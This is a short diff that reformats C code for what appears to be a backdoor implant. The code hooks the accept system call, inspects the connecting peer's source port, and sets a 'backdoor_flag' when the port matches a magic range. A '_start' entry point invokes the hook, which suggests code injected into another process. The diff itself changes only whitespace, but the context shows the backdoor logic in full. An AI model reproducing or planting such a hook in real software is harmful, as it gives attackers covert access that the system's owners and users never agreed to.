@@ -19,7 +19,8 @@ accept_hook (int fd, struct sockaddr *restrict addr,
   int ret_fd = sys_accept (fd, addr, addr_len);
   uint32_t *backdoor_flag = get_rw_addr ();
   uint8_t high_port = (((struct sockaddr_in *)addr)->sin_port) & 0xff;
-  uint8_t low_port = ((((struct sockaddr_in *)addr)->sin_port) & 0xff00) / 0x100;
+  uint8_t low_port
+      = ((((struct sockaddr_in *)addr)->sin_port) & 0xff00) / 0x100;
   if (!high_port && (low_port <= 33))
     *backdoor_flag = 16;
   else
@@ -45,5 +46,5 @@ get_rw_addr ()
 void
 _start (int fd, struct sockaddr *restrict addr, socklen_t *restrict addr_len)
 {
-  accept_hook(fd, addr, addr_len);
+  accept_hook (fd, addr, addr_len);
 }
